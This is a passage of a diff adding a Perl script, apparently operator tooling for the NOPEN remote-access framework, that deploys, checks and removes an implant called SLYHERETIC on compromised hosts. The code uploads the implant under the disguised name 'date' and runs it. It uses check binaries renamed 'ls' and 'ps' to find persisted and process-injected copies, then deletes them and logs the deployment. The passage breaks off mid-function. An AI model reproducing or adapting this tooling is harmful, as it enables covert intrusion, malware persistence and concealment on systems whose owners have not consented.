@@ -1,0 +1,946 @@
+#!/usr/bin/env perl
+##
+
+use File::Basename ;
+$VER="1.0.0.2";
+
+$| = 1 ;
+my $tarball="";
+my ($installoutput,$errcode,$errstring,$success) = ();
+my ($allcontent,$allwarning) = ();
+my ($alreadyrunning,$alreadyinstalled,$alreadyrunningbefore,$alreadyinstalledbefore) = () ;
+$versionfile = "";
+
+myinit() ;
+
+if ($ARGV[0]) {
+  $warning = "$ARGV[0] does not exist\n\n" if
+    ($tarball ne "NULL" and
+    (! -f $tarball)
+    );
+}
+unless ($logonly or $checkpersistonly or $deinstallonly) {
+    while (!$tarball) {
+        my @rest=();
+        @rest = ("none") if @ARGV;
+	($tarball,$long) = mygetinput("${warning}What tarball (or ABORT)?",@rest);
+	if (lc $tarball eq "none") {
+	  $tarball = "";
+	  last;
+	}
+        mydie("User aborted") if $tarball =~ /^a/i;
+        unless (!$tarball or -f $tarball) {
+	  mywarn("$tarball: File does not exist");
+	  $tarball = "";
+        }
+    }
+}
+
+my ($newhostinfocontent,$extrahostinfocontent,
+    %newhostinfocontentfile,%extrahostinfocontentfile) = ();
+my ($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,$localppid,
+    $serverver,$wdir,$targetos,$targetcwd,$targetpid,$targetppid,$targetport)
+  = parsestatus("force");
+
+
+my $slyinstalldir = $targetcwd;
+
+unless ($logonly or $targetcwd eq $workdir) {
+  my ($ans) = mygetinput("Your working directory is not $workdir.\n".
+			 "Do you want to -cd to $workdir first?","Y");
+  if ($ans eq "y") {
+    my ($output,$nopenlines,@output)
+      = doit("-cd $workdir");
+    mydie("Up-arrow and run it again now that you are in $workdir");
+    $slyinstalldir = $workdir;
+  } else {
+    newhostvar("host_workingdir",$targetcwd);
+  }
+}
+
+my $hostfile = "$opdown/hostinfo.$nopen_rhostname";
+if (! -f $hostfile and -f "$hostfile.0000") {
+  my @list = split(/\n/,`ls -rt1 $hostfile*`);
+  rename($list[$#list],$hostfile);
+}
+
+offerabort
+  ("Normally, NOPEN should have run autodone by this time and\n\n".
+   "      $hostfile\n\n".
+   "would exist by now. You can abort now and run:\n\n".
+   "      -gs auto new\n\n".
+   "if you want a complete hostinfo file for $prog to append to.\n\n".
+   "If you continue, $prog will create a partial hostinfo file."
+  ) unless -s $hostfile;
+
+my $count = 0;
+$count++ while -e "$optmp/${nopen_rhostname}.install.$count";
+$count-- if ($logsuccess or $logfailure);
+my $localinstalldir = "$optmp/${nopen_rhostname}.install.$count" if $count >= 0;
+if ($deinstallonly and ! -s $tarball) {
+    $localinstalldir = "$opdir";
+    my $targettype = "";
+    my @deinstallbinaries = ();
+    while (!$deinstallbinary) {
+	(@deinstallbinaries) = reverse sort (findfilematching("uninstall/i","f","$localinstalldir/up","$opdir/fg",$optmp))
+		unless @deinstallbinaries;
+	($deinstallbinary) = grep /64-linux/i , @deinstallbinaries if ($intel64target and $linuxtarget);
+	($deinstallbinary) = grep /linux/i , @deinstallbinaries if ( !$deinstallbinary and $linuxtarget);
+	($deinstallbinary) = grep /64-darwin/i , @deinstallbinaries if ($intel64target and $darwintarget);
+	($deinstallbinary) = grep /darwin/i , @deinstallbinaries if ( !$deinstallbinary and $darwintarget);
+	($deinstallbinary) = grep /solaris/i , @deinstallbinaries if ( !$deinstallbinary and $solaristarget);
+	(undef,$deinstallbinary) = mygetinput
+	    ("When uninstalling and no tarball is provided, you need to provide $prog\n".
+	     "a full path to your uninstall binary, or you can ABORT.\n".
+	     "Uninstaller to use: ",
+	    $deinstallbinary);
+	mydie("User aborted") if ( lc $deinstallbinary eq "a" or lc $deinstallbinary eq "abort");
+    }
+
+} else {
+  unless (!$localinstalldir or -d $localinstalldir) {
+    mkdir $localinstalldir or mydie("Could not create $localinstalldir");
+  }
+  chdir $localinstalldir or mydie("Could not cd to $localinstalldir");
+}
+
+
+if ($checkpersistonly ) { #or $deinstallonly) {
+    checkpersist($slyveropt);
+} 
+# This part is only when we have a tarball
+dbg("Calling:  handle($tarball) if tarball=$tarball or logonly=$logonly;");
+if ($tarball or $logonly or $deinstallonly) {
+    my $progress = handle($tarball,$deinstallbinary) ;
+}
+
+1;
+## END MAIN ##
+
+sub findversionfile {
+  local ($dir,$matchstring,$optional) = (@_);
+  # Returns content of only file in $dir matching $matchstring, which defaults to etc.version
+  # (match is case insensitive). Unless $optional is set, the file must be there or we mydie().
+
+  return "" unless ($dir and -d $dir);
+  $matchstring = "etc.version" unless $matchstring;
+  my @lines = split(/\n/,`cd $dir 2>/dev/null && find . 2>/dev/null | grep -i "$matchstring" 2>/dev/null`);
+  return "$dir/$lines[0]" if (@lines == 1 and -s "$dir/$lines[0]" > 0);
+  my $what = "has more than one";
+  $what = "has an empty" if (@lines == 1);
+  mydie(`cd $dir  2>&1 && find . -ls 2>&1 | grep -i etc.version`."\n".
+        "Your tarball, unpacked here:\n".
+	"   $dir\n".
+	"$what version file. Fix that and try again.")
+      unless $optional;
+}
+# findversionfile
+
+sub handle {
+  local ($targetball,$deinstallbinary) = (@_);
+  my $baseball = basename $targetball;
+#  dbg("In handle(@_)");
+  my %toolindex = (); # key=0-N index value=toolname
+  my $output;
+  $targetball = "NULL" unless $targetball;
+  $versionfile = findversionfile($localinstalldir,undef,1);
+  if (!$logonly or $logfailureball or $logsuccessball) {
+    unless ($targetball eq "NULL") {
+	`tar xvjf $targetball 2>$localinstalldir/tar.$baseball.err`;
+	$versionfile = findversionfile($localinstalldir);
+	mydie("Could not properly untar $tarball:\n".`cat $localinstalldir/tar.$baseball.err`)
+		if (! (-f $versionfile) or 
+		      (-s "$localinstalldir/tar.$baseball.err"));
+    }
+    if (-f $targetball) {
+	progprint($COLOR_NORMAL."\n\n\n".
+	      "Just unpacked in $localinstalldir:\n\n".
+	      `cd $localinstalldir ; find . -name tar.$baseball.err -prune -o -type f -ls | sed "s/.*  root //g"`.
+	      "\n\ncat $versionfile\n".
+	      `cat $versionfile 2>/dev/null`);
+    }
+    $logsuccess = $logsuccessball if  $logsuccessball;
+    $logfailure = $logfailureball if  $logfailureball;
+
+    ($deinstallbinary) = findfilematching("uninstall/i","f","$localinstalldir/up")
+	unless $deinstallbinary;
+  }
+  if ($deinstallonly) {
+    mydie("-u $deinstallbinary not there or not in an /up/ directory\n\n".
+	`ls -al $deinstallbinary 2>/dev/null`)
+	unless (-f $deinstallbinary and $deinstallbinary =~ m,/up/,);
+  }
+
+  my @versions = readfile("ARRAY",$versionfile);
+  
+  my ($slyver) = grep /SLYHERETIC/i, @versions;
+  $slyver =~ s,.*SLYHERETIC.*v,,i;
+  $slyver =~ s,\s,,g;
+
+  my (@datefiles) = findfilematching("date","f","$localinstalldir/up");
+  my ($persistentdatefile) = grep /persistent/i , (grep ! /nonpersistent/i , @datefiles);
+  my ($nonpersistentdatefile) = grep /nonpersistent/i ,  @datefiles;
+  my $datefile = $persistentdatefile;
+  $datefile = $nonpersistentdatefile if $donotpersist;
+  mydie("No current or prior install directories found in $optmp\n".
+	"for $nopen_rhostname")
+	unless -d $localinstalldir;
+  mydie("SLYHERETIC build has wrong number of date binaries in\n".
+	"  $localinstalldir\n".
+	"(".scalar @datefiles."), must be TWO")
+	if (!$deinstallonly and scalar @datefiles != 2);
+
+
+  if ($slyver) {
+    mydie("$prog only knows how to handle SLYHERETIC tarballs with two\n\t".
+            "up/date* packages and Slyheretic_Check* files:\n\n".
+            `cd $localinstalldir ; find . -type f -ls | sed "s,.* root ,,g"`
+	  ) unless ($targetball eq "NULL" or
+              (-f $persistentdatefile and -f $nonpersistentdatefile) or 
+             ($logsuccessball or $logfailureball));
+  } else {
+    mydie("$prog\n\n".
+	  "There are not any valid installable tools in that file:\n".
+	  "$COLOR_NORMAL\n".
+            `cd $localinstalldir ; find . -type f -ls | sed "s,.* root ,,g"`
+	 );
+  }
+
+# dbg("DBG: 
+#persistentdatefile=$persistentdatefile= nonpersistentdatefile=$nonpersistentdatefile= slyinstall=$slyinstall= slyver=$slyver=
+#targetball=$targetball= slyver=$slyver= localinstalldir=$localinstalldir= deinstallbinary=$deinstallbinary=");
+
+  my $problems = "";
+#  unless ($deinstallonly) {
+    $versionfile = findversionfile($localinstalldir,undef,1);
+
+    my ($installedtools,$nopenlines,@installedoutput)
+      = doit("-lsh cat $versionfile") if (-f $versionfile and -s _);
+    my ($solaristoolversion,
+	$linuxtoolplatform,
+	$solaristoolplatform,
+	$freebsdtoolplatform,
+	$inteltoolplatform,
+	$sparctoolplatform,
+	$toolcomment,@comment,
+	$toolversion,
+       ) = ();
+    
+    foreach (@installedoutput) {
+      next if /None vNone/;
+      s/\s/ /g;
+      if (-e "$localinstalldir/etc/VERSION") {
+	($tool,$toolplatform,$toolversion,@comment) = split;
+      } else {
+	($tool,$toolversion,$toolplatform,@comment) = split;
+      }
+      if ($toolversion =~ /(linux|solaris)/i and
+	  $toolplatform =~ /\d+\.\d+/) {
+	($toolversion,$toolplatform) = ($toolplatform,$toolversion);
+      }
+      $toolcomment = join(" ",@comment);
+      $linuxtoolplatform = $1 if
+	$toolplatform =~ /(\S*linux\S*)/i;
+
+      # SOLARIS
+      $solaristoolplatform = $1 if
+	$toolplatform =~ /(\S*(sunos|solaris)\S*)/i;
+      if ($solaristoolplatform =~ /([\d\.]+)$/) {
+	$solaristoolversion = $1;
+      }
+
+      # JUNOS
+      $junostoolplatform = $1 if
+	$toolplatform =~ /(\S*junos\S*)/i;
+      if ($junostoolplatform =~ /([\d\.]+)$/) {
+	$junostoolversion = $1;
+      }
+
+      # FREEBSD
+      $freebsdtoolplatform = $1 if
+	$toolplatform =~ /(\S*(freebsd)\S*)/i;
+      if ($freebsdtoolplatform =~ /([\d\.]+)$/) {
+	$freebsdtoolversion = $1;
+      }
+
+      # HARDWARE
+      $inteltoolplatform = $1 if
+	$toolplatform =~ /(\S*[i3456x]+86\S*)/;
+      $sparctoolplatform = $1 if
+	$toolplatform =~ /(\S*(sparc|sun4[umc])\S*)/;
+      
+      my $sure = 0;
+      $problems .= "   Mismatch on: $tool $toolversion $toolplatform\n"
+	if (($linuxtarget and !$linuxtoolplatform) or
+	    ($solaristarget and !$solaristoolplatform) or
+	    ($freebsdtarget and !$freebsdtoolplatform) or
+	    ($junostarget and !$junostoolplatform) or
+	    ($inteltarget and !$inteltoolplatform) or
+	    ($sparctarget and !$sparctoolplatform) or
+	    ($freebsdtoolplatform and $freebsdtargetversion
+	     and ($freebsdtargetversion !~ /$freebsdtoolversion/)) or
+	    ($solaristoolversion and $solaristargetversion
+	     and $solaristoolversion ne $solaristargetversion) or
+	    ($junostoolversion and $junostargetversion
+	     and $junostoolversion ne $junostargetversion)
+	   );
+      $toolversion =~ s/^v(ersion|\s)*//;
+      ($toolversion) = $toolversion =~ /((\d+\.*){1,8})/;
+      dbg("INSIDE:$_
+  linuxtarget=$linuxtarget
+  solaristarget=$solaristarget   solaristargetversion=$solaristargetversion
+  solaristoolversion=$solaristoolversion   solaristargetversion=$solaristargetversion
+  inteltarget=$inteltarget
+  sparctarget=$sparctarget
+  linuxtoolplatform=$linuxtoolplatform
+  solaristoolplatform=$solaristoolplatform
+  inteltoolplatform=$inteltoolplatform
+  sparctoolplatform=$sparctoolplatform
+
+  freebsdtarget=$freebsdtarget=
+  freebsdtoolplatform=$freebsdtoolplatform
+  freebsdtargetversion=$freebsdtargetversion
+  freebsdtoolversion=$freebsdtoolversion
+
+
+  problems=$problems==
+
+toolplatform=$toolplatform=
+toolversion=$toolversion=
+tool=$tool=
+comment=(@comment)
+");
+      push @tools,$tool;
+      $toolindex[$tool] = scalar @tools - 1;
+      $toolindex["SLIPPERYSCALPEL"] = @tools - 1
+	if ($tools[$i] =~ /SLIPPERYSCALPEL/i);
+      push @versions,$toolversion;
+      push @toolplatforms,$toolplatform;
+      push @comments,$toolcomment;
+      if (!$slyveropt and lc $tool eq "slyheretic" and $toolversion =~ /((\d+\.*){1,8})$/) {
+#offerabort("Changing from slyveropt=$slyveropt= to 1=$1= from toolversion=$toolversion=");
+#($ans,$usever) = mygetinput("DBG: 1=$1= usever=$usever= toolversion=$toolversion=",$usever);
+#mydie() if $ans eq "a";
+	$slyveropt = $1;
+      }
+    }
+#  }
+  dbg("
+  linuxtarget=$linuxtarget
+  solaristarget=$solaristarget
+  inteltarget=$inteltarget
+  sparctarget=$sparctarget
+  linuxtoolplatform=$linuxtoolplatform
+  solaristoolplatform=$solaristoolplatform
+  inteltoolplatform=$inteltoolplatform
+  sparctoolplatform=$sparctoolplatform
+  problems=$problems=
+");
+
+  my $slyinstall = "@tools" =~ /slyheretic/i;
+  $slyinstall = 0 if $deinstallonly;
+
+  if ($problems) {
+    my $more = "\n(OS version mismatch: $solaristoolversion ne $solaristargetversion)"
+      if $solaristoolversion ne $solaristargetversion;
+    offerabort
+      ($COLOR_FAILURE.$problems."\n\n".
+       "WE HAVE A PROBLEM HERE.\n$COLOR_NORMAL\n".
+       "Target OS: $nopen_serverinfo\n\n".
+       "Target OS does not match one or more tool platforms.\n\n".
+       "There appears to a conflict here.".$more,
+       "A"
+      );
+    offerabort
+      ($COLOR_FAILURE."ARE YOU SURE?");
+  }
+
+  $remotename = "date" unless $remotename;
+  my $domore = " ; echo $?" unless $remotename eq "date";
+  while (!$deinstallonly and !$logonly) {
+    my ($remoteexists,$nopenlines,@output)
+      = doit("-ls $slyinstalldir/$remotename");
+    if ($remoteexists) {
+      my ($ans,$newname) = mygetinput
+	("Remote file \"$remotename\" already exists. If you CONTINUE,\n".
+	 "you will have to answer \"YES\" to overwrite that file,$COLOR_FAILURE\n".
+	 "AND THAT FILE DOES NOT APPEAR TO BE OURS!\n$COLOR_NORMAL\n".
+	 "If you enter some other name, $prog will try to use that.\n\n".
+	 "Enter \"CONTINUE\" or \"$remotename\" to continue with the name ".
+	 "\"$remotename\",\"ABORT\" to abort, or enter the new name to use: \n",
+	 "CONTINUE"
+	);
+      mydie("User aborted")
+	if ($newname =~ /^a(bort){0,1}$/i);
+      last if $newname eq "CONTINUE";
+      $remotename = $newname;
+    } else {
+      last;
+    }
+  }
+
+  my $morecheck = "";
+  unless ($logonly) {
+    $datefile = $deinstallbinary if ($deinstallonly);
+
+    offerabort
+      ("Looks like the target matches the tarball.\n\n".
+       "About to upload and execute\n".
+	"  $datefile$solarismore. Last chance to bail.")
+	unless ($targetball eq "NULL" or $deinstallonly);
+    ($alreadyrunning,$alreadyinstalled) = checkpersist(undef,BEFORE);
+    ($alreadyrunningbefore,$alreadyinstalledbefore) = ($alreadyrunning,$alreadyinstalled) ;
+    $alreadyrunningbefore =~ s,^\n+,,g;
+    $alreadyinstalledbefore =~ s,^\n+,,g;
+
+    my ($dev,$ino,$mode,$nlink,$uid,$gid,$rdev,$size,
+	$atime,$mtime,$ctime,$blksize,$blocks)
+      = stat($datefile);
+      
+    @errs = ();
+    if ($alreadyrunning or $alreadyinstalled) {
+	my ($prompt,$default) = 
+	  ("It seems SLYHERETIC is already there. Do you even NEED a fresh install?\n\n".
+	   "You must choose UNINSTALL in order to continue with a fresh install.\n\n".
+	   " UNINSTALL: We run the new installer, which does nothing to the injected\n".
+	   "            binary, but does uninstall and re-install the persisted one. The\n".
+	   "            new persisted binary likely will differ than the old one.\n".
+	   "            NOTE:  The only way to uninstall the injected binary is with\n".
+	   "                   the -U option.\n\n".
+#Use the uninstaller to completely UNINSTALL previous SLY.\n".
+	   #" CONTINUE : Continue with the install without ANY uninstall of the previous\n".
+	   #"            SLY. \n".
+	   " ABORT    : Abort and return to your NOPEN prompt\n\n".
+	   "\n".
+	   "You must UNINSTALL or ABORT. Choose:",
+	   "UNINSTALL"
+	  );
+#a=b TODO LEFTOFFHERE:  This above never really happens, namely if we say UNINSTALL at that prompt it instead just willy nilly uses the installer and installs, which appears to uninstall sufficiently so ....wuwt? asked via email 04 NOV about this.....1720 or so
+
+
+	($prompt,$default) = 
+	  ("Confirmed previous installation of SLYHERETIC is still present.\n".
+	   "(See above and popped up CheckProcess and CheckPersist output.)\n\n".
+	   "Last chance to bail before UNINSTALL proceeds.".
+	   "\n\n<UNINSTALL> or <ABORT>.","UNINSTALL"
+	  ) if $deinstallonly;
+	my ($ans,$myans) = mygetinput($prompt,$default);
+	if ($ans eq "a") {
+	  mydie("User aborted");
+	}
+	($ans,$myans) = ("u","UNINSTALL") if $deinstallonly;
+
+# TODO:  Log the uninstalls properly with logtool()....need the old versions for that.
+
+
+#	if ($ans eq "d" or $ans eq "u") {
+#	    $dowhat = "UNINSTALL";
+#dbg("Now errs=(@errs) nonerrs=(@nonerrs)");
+#	    if (@errs) {
+#	      offerabort("$dowhat appeared to fail.");
+#	    }
+#	}
+    } else {
+        mydie("SLYHERETIC does not appear to be there--no UNINSTALL required.")
+	  if $deinstallonly;
+    }
+    if ($extracmd) {
+	($ans,$extracmd) = mygetinput
+	    ("You used the -p option: Enter the command or environment definition\n".
+	     "you want to run before running \"$remotename$domore\" (or enter nothing\n".
+	     "or enter ABORT to abort).\n\n".
+	     "Extra command: ");
+	mydie("User aborted")
+	    if ($extracmd =~ /^\s*abort/i);
+	$extracmd .= " " if (length $extracmd);
+    }
+    
+    ($output,$nopenlines,@output)
+      = doit("-put $datefile $slyinstalldir/$remotename");
+
+    mydie("\n\nUpload failed (wrong size or missing?), you have cleanup to do.")
+      unless ($output =~ m,-rwx------ .* $size .* $slyinstalldir/$remotename,);
+  
+    # ASSERT: $remotename is up there, executable and the right size.
+
+    if ($dopause) {
+      doit("-ls $slyinstalldir/$remotename");
+      offerabort("OK, here's the pause you asked for. Upload worked.\n\n".
+		 "If you abort here, $remotename will$COLOR_FAILURE STILL BE UP THERE!!");
+    }
+    doit("-cd $slyinstalldir") unless $targetcwd eq $slyinstalldir;
+
+#    my ($newpath) = grep /PATH=/,nopenaddpath(".");
+#    mydie("This  is bad, our PATH should start with $targetcwd and instead it is: PATH=$newpath")
+#      unless ($newpath =~ m,^PATH=$targetcwd:,);
+#doit("which $remotename");
+#offerabort("DBG: about to run doit(${extracmd}$remotename$domore)");
+
+    ($installoutput,$nopenlines,@output) =
+    	doit("${extracmd}./$remotename$domore");
+    # CD back unless we did not cd, or we came from hidden dir.
+    doit("-cdp") unless ($targetcwd eq $slyinstalldir or
+			 $targetcwd =~ m,/\.[a-f0-9]{32}, or
+			 $targetcwd =~ m,/\.tmp[A-Za-z0-9_-]{6},);
+  }
+  ($alreadyrunning,$alreadyinstalled) = checkpersist(undef,AFTER);
+  $success = "SUCCESSFUL";
+  if ($logonly) {
+    $success = "FAILED" if $logfailure or $logfailureball;
+  } else {
+    ($errcode,$errstring) = $installoutput =~ / \d\d:\d\d:(\d\d)/;
+    unless ($errcode eq "00" or ($deinstallonly and !$alreadyrunning and !$alreadyinstalled)) {
+      $success = "FAILED";
+      if ($errstrings{int $errcode}) {
+	$errstring = $errstrings{int $errcode};
+      } else {
+	$errstring = "UNKNOWN ERROR #: $errcode";
+	if ($deinstallonly) {
+	    $errstring = "UNKNOWN ERROR on UNINSTALL";
+	    $errstring .= ", output was: $installoutput" if $installoutput;
+	}
+      }
+    }
+  }
+  for (my $i=0;$i<@tools;$i++) {
+    my ($what1,$what2) = ("DEPLOYED","Installed");
+    ($what1,$what2) = ("EXERCISED","Exercised")
+      unless ($installtype =~ /install/);
+    ($what1,$what2) = ("ACCESSD","Accessd")
+      if ($installtype eq "access");
+    ($what1,$what2) = ("USED","Used")
+      if ($installtype eq "use");
+    ($what1,$what2) = ("REMOVED","Removed")
+      if ($deinstallonly or $installtype eq "remove");
+    my $others = " @tools";
+    $others =~ s/ $tools[$i]//;
+    my $toolcomment = "";
+    $toolcomment = " $comments[$i]"
+      if (length $comments[$i]);
+    if ($deinstallonly) {
+        $toolcomment .= " HAD BEEN Persisted $alreadyinstalledbefore" if $alreadyinstalledbefore;
+	$toolcomment .= " HAD BEEN injected into $alreadyrunningbefore" if $alreadyrunningbefore;
+	$toolcomment .= ", ";
+    } elsif ($donotpersist) {
+	$toolcomment .= " NON-persistent (so only injection), injected into $alreadyrunning";
+    } else {
+	$toolcomment .= " Persisted $alreadyinstalled, injected into $alreadyrunning";
+    }
+    if ($zfssnapshot) {
+	$zfssnapshot =~ s,([\r\n]),$1Tool Comments: ,g ;
+	$toolcomment .= " ZFS snapshot exists:\nTool Comments: $zfssnapshot";
+    }
+    $toolcomment =~ s/\n/, /g;
+
+#offerabort("DBG:\n\n ".
+#         "$tools[$i]=\n".
+#         "$versions[$i]=\n".
+#         "$success=\n".
+#         "$what1=\n".
+#         "$toolcomment $what2 with$others $errstring=\n",
+#        );
+
+    my ($content,$warning) = logtool(
+	 "$tools[$i]",
+	 "$versions[$i]",
+	 "$success",
+         "$what1",
+	 "$toolcomment $what2 with$others $errstring",
+	);
+    $allcontent .= $content;
+    $allwarning .= $warning;
+  }
+
+  if ($tarball) {
+      mkdir "$optooldir/SLYHERETIC/";
+      copy($tarball,"$optooldir/SLYHERETIC/INSTALLED_WITH_".basename($tarball));
+  }
+
+  progprint($COLOR_FAILURE.
+	    "Finished.\n$progress\n$COLOR_NOTE\n".
+	    "$prog just added these entries to\n".
+	    "$hostfile:\n\n$COLOR_NORMAL".$allcontent.
+	    "\n".$allwarning
+	   );
+
+  ($output,$nopenlines,@output)
+    = doit("-ls $slyinstalldir/$remotename") unless $logonly;
+  if ($output and $success =~ /^successful/i) {
+    my ($ans) = offerabort
+      ("$COLOR_NORMAL\nPROPOSED HOSTINFO CONTENT:\n".
+       $newhostinfocontent."\n\n".
+       "$COLOR_FAILURE $output\n".
+       "$COLOR_NORMAL\n".
+       "The $remotename file still exists. This usually indicates failure,\n".
+       "but the output ending in :00 seemed to indicate success.\n\n".
+       "You can abort here and nothing will be logged to\n".
+       "   $hostfile.\n".
+       "Or choose another option, which will log there:\n".
+       "  1) Change all statuses to \"Failed\"\n".
+       "  C) Log it as successful anyway (really?)\n\n".
+       "Choose one, or",
+       "1","2"
+      );
+    if ($ans eq "1") {
+      $newhostinfocontent =~ s/success\S+/FAILED/ig;
+    }
+  }
+  unless ($logonly) {
+    if ($deinstallonly) {
+
+
+    } else { 
+	progprint("DBG: alreadyrunning,alreadyinstalled==$alreadyrunning,$alreadyinstalled==");
+	my $instate = "successful";
+	$instate = "to have FAILED!" if ($success =~ /fail/i);
+	progprint("\n$COLOR_FAILURE\n".
+		"Install appears $instate$solarismore! Its output was:\n$COLOR_NORMAL\n".
+		"   $installoutput\n\n".
+		#"\nHit Enter to continue...".
+		"");
+    }
+  } else {
+    my $which = "most recent install";
+    $which = "contents of this tarball" if $logfailureball or $logsuccessball;
+    $output = "Logged $which ($localinstalldir) as: $success";
+  }
+#  progprint($output);
+  return $output;
+}#end sub handle
+
+sub checkpersist {
+    local ($slyver,$which) = (@_);
+    my ($usever,$abort) = ();
+    $which = "BEFORE" if ($deinstallonly and !$which);
+    if ($slyveropt) {
+        $usever = $slyveropt;
+    } else {
+        ($abort,$usever) = mygetinput
+            ("${warning}\n".
+            `cd $opup ; find ../up/slyheretic_checks/ -type f | grep -i checkp`."\n".
+            "Target platform is: $targetos\n\n".
+#"DBG:slyver=$slyver=\n".
+            "What version of the above tools (or triple-click one such line)?");
+    }
+#(undef,$usever) = mygetinput("DBG slyveropt=$slyveropt= slyver=$slyver= usever=$usever= what is new usever?",$usever);
+    $usever = $2 if ($usever =~ /(_|v){0,1}((\d+\.*){1,8})/);
+    $slyveropt = $usever unless $slyveropt;
+    # This does not return
+    mydie("User aborted") if ($abort eq "a");
+    $which = ".$which" if $which;
+progprint("Called as checkpersist(@_)");
+    my $finddir = $localinstalldir;
+    my ($checkpersistfile, $checkprocessfile) =  ();
+    while (1) {
+#(undef,$usever) = mygetinput("DBG slyveropt=$slyveropt= slyver=$slyver= usever=$usever= what is new usever?",$usever);
+	($checkpersistfile) =  findfilematching("CheckPersist.*$usever/i",f,$finddir,"$opup/slyheretic_checks");
+	($checkprocessfile) =  findfilematching("CheckProcess.*$usever/i",f,$finddir,"$opup/slyheretic_checks");
+	$slyver = $2 if ($checkprocessfile =~ /(v|_)(\d+\.\d+\.\d+\.\d+)/);
+	last if (-f $checkpersistfile and -f $checkprocessfile);
+	mydie("\n\nUnable to find a match to CheckP(rocess|ersist)$slyver in $finddir or $opup/slyheretic_checks.\n".
+		"");
+    }
+    my ($lsdots,$psdots,$remotels,$remoteps) = ();
+    while (1) {
+	my $lsthis = "";
+	unless ($remoteps) {
+	    $lsthis .= " ps$psdots";
+	    #my ($output) = doit("-ls ps$psdots");
+	}
+	unless ($remotels) {
+	    #my ($output) = doit("-ls ls$lsdots");
+	    $lsthis .= " ls$lsdots";
+	}
+	my ($output) = doit("-ls$lsthis") if $lsthis;
+	$remoteps = "ps$psdots" unless ($output =~ / ps/);
+	$remotels = "ls$lsdots" unless ($output =~ / ls/);
+	last if ($remotels and $remoteps);
+	$lsdots .= "." unless $remotels;
+	$psdots .= "." unless $remoteps;
+    }
+    
+    doit("-put $checkpersistfile $remotels");
+    doit("-put $checkprocessfile $remoteps");
+    my ($psout,$lsout) = ("$optmp/checkps.$nopen_rhostname",
+			"$optmp/checkls.$nopen_rhostname",
+			);
+    unlink($lsout,$psout);
+    my (undef,undef,@lsout) = doit("./$remotels > L:$lsout");
+    my (undef,undef,@psout) = doit("./$remoteps > L:$psout");
+    my ($foundinstalled) = grep /\'(.+)\'/ , readfile(ARRAY,$lsout);
+    my ($foundrunning) = join(" --AND-- ",grep /\d\d[\.:]\d\d  (.*)/ , readfile(ARRAY,$psout));
+    doit("-rm $remotels $remoteps");
+    # NOTE: Some of these check binaries put null chars in their stdout, so we tr -d them,
+    # or else NOPEN screws up that output dropping some on the ground.
+    my ($results) = doit("-lsh echo === BEGIN LIKELY MATCHES:;echo ; ( echo CheckPersist for $nopen_rhostname: ; egrep --binary-file=text  \"'.*'\" $lsout || echo '[NO MATCHES FOUND IN ./$remotels OUTPUT]' ; echo;echo CheckProcess for $nopen_rhostname: ; egrep --binary-file=text \"[\\.:][0-9][0-9]  [^ ].*\" $psout || echo '[NO MATCHES FOUND IN ./$remoteps OUTPUT]' ) |tee $optmp/.matches ; echo;echo === END LIKELY MATCHES, COMPLETE LISTINGS FOLLOW ; more $lsout $psout | tr -d '\\000'  >>L:/dev/null");
+    #mydo("autopopup","\\-lsh ls -al $lsout $psout ; more $lsout $psout");
+    my ($sizediff,$findsize,$targetsize) = ();
+    if ($foundinstalled =~ /\'(.*)\'/) {
+	my ($results) = doit("-ls -i /usr/libexec/$1 /*bin/$1 /*/*bin/$1 /*/*/*bin/$1");
+	if ($results) {
+	    ($targetsize) = $results =~ / (\d+) (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)/;
+	    $foundinstalled = "\nON FILE SYSTEM IT IS NOW:\n$results" ;
+	}
+	my (@findresults) = grep m,( mtime .* atime |(libexec|bin)/$1$), , readfile(ARRAY,"$opdown/cmdout/$nopen_rhostname-find");
+	my $findresults = join("\n",@findresults);
+	if (@findresults > 1) {
+	    ($findsize) = $findresults =~ / (\d+) \| (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)/;
+            $foundinstalled .= "\nFROM FIND, IT USED TO BE:\n$findresults" ;
+	}
+    }
+    my $matches = readfile("$optmp/.matches");
+    $matches .= $findresults;
+    if ($targetsize and $findsize) {
+	$sizediff = " ".int($targetsize - $findsize)." BYTES BIGGER";
+	$foundinstalled =~ s,IT IS NOW,IT IS NOW$sizediff,;
+    }
+    if ($matches) {
+	$matches = "=== BEGIN LIKELY MATCHES:\n$matches\n===END LIKELY MATCHES, COMPLETE LISTINGS FOLLOW\n";
+    }
+    #$results =~ s,${optmp}/*check(.)s.$nopen_rhostname:,check${1}s.$nopen_rhostname:\n  ,g;
+    $results =~ s,=== END LIKELY,$foundinstalled\n=== END LIKELY,g if $foundinstalled;
+    my $pastesearches = ' (triple click them):
+
+/[.:][0-9][0-9]  [^ ].*
+/\'.*\'
+';
+    $results =~ s,::::::::::::::,Useful searches in this window$pastesearches\n::::::::::::::,;
+    $which = ".".timestamp(short).$which;
+    writefile("$opdown/Slycheck.$nopen_rhostname.results$which",$results);
+    filepopup("$opdown/Slycheck.$nopen_rhostname.results$which");
+    my $foundoutput = "";
+    $foundoutput .= "\nSLYHERETIC seems to be persisted here:\n".
+		$foundinstalled if $foundinstalled;
+    $foundoutput .= "\nSLYHERETIC seems to be running here:\n".
+		$foundrunning if $foundrunning;
+    $foundoutput .= 
+                "\n\nUseful searches in that popup include these (triple click them):\n\n".
+                "/[\.:][0-9][0-9]  [^ ].*\n".
+                "/'.*'\n" if $foundoutput;
+    progprint(	$COLOR_NORMAL."\n\n".
+		$foundoutput.
+	"") if $foundoutput;
+    if ($foundrunning or $foundinstalled) {
+	my $comment = $foundinstalled;
+	$comment .= ", " if $comment;
+	my $version = $slyveropt;
+	$comment .= "Injected into $foundrunning" if $foundrunning;
+	$comment =~ s/\n/, /g;
+	my ($content,$warning) = logtool(
+		"SLYHERETIC",
+		"$version",
+		"SUCCESSFUL",
+		"CHECKED",
+		$comment,
+		) if $checkpersistonly;
+    } else {
+	#TODO?: Do we want to log UNSUCCESSFUL for CHECKED status here? Maybe only when !$deinstallonly?  or when $checkpersistonly?
+	if (0 and !$deinstallonly) {  # the 0 means this is NOT being done....do we want it?
+	    my $comment = "SLYHERETIC neither running nor installed";
+	    my ($content,$warning) = logtool(
+                "SLYHERETIC",
+                "$version",
+                "FAILED",
+                "CHECKED",
+                $comment,
+                ) if $checkpersistonly;
+	}
+	progprint("$COLOR_NORMAL\n\n".
+		"SLYHERETIC does not appear to be running or installed.\n".
+		"See full $remotels and $remoteps output just popped up, and also here:\n\n".
